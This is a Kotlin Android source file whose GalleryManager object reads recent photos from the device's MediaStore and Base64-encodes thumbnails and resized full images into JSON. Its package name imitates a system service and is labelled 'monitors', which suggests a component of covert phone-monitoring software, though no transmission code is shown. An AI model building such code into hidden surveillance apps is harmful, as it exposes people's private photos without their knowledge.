package com.system.service.monitors

import android.content.Context
import android.graphics.BitmapFactory
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File

object GalleryManager {

    fun getRecentPhotos(context: Context, limit: Int = 20): JSONArray {
        val result = JSONArray()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )
        val cursor = context.contentResolver.query(
            uri, projection, null, null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC")
        cursor?.use {
            val colId   = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val colName = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val colPath = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val colDate = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val colSize = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            var count = 0
            while (it.moveToNext() && count < limit) {
                val path = it.getString(colPath) ?: continue
                if (!File(path).exists()) continue
                val obj = JSONObject().apply {
                    put("id",   it.getLong(colId))
                    put("name", it.getString(colName) ?: "")
                    put("date", it.getLong(colDate) * 1000L)
                    put("size", it.getLong(colSize))
                    put("path", path)
                }
                // API-26-safe thumbnail using BitmapFactory inSampleSize
                try {
                    val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                    BitmapFactory.decodeFile(path, opts)
                    val maxDim = maxOf(opts.outWidth, opts.outHeight)
                    opts.inSampleSize = maxOf(1, maxDim / 200)
                    opts.inJustDecodeBounds = false
                    val bmp = BitmapFactory.decodeFile(path, opts)
                    if (bmp != null) {
                        val baos = ByteArrayOutputStream()
                        bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, baos)
                        obj.put("thumb", Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                    }
                } catch (_: Exception) {}
                result.put(obj)
                count++
            }
        }
        return result
    }

    fun getFullPhoto(context: Context, path: String): String? {
        return try {
            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(path, opts)
            val maxDim = maxOf(opts.outWidth, opts.outHeight)
            val scale = if (maxDim > 1080) maxDim / 1080 else 1
            opts.inSampleSize = scale
            opts.inJustDecodeBounds = false
            val bmp = BitmapFactory.decodeFile(path, opts) ?: return null
            val baos = ByteArrayOutputStream()
            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos)
            Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) { null }
    }
}
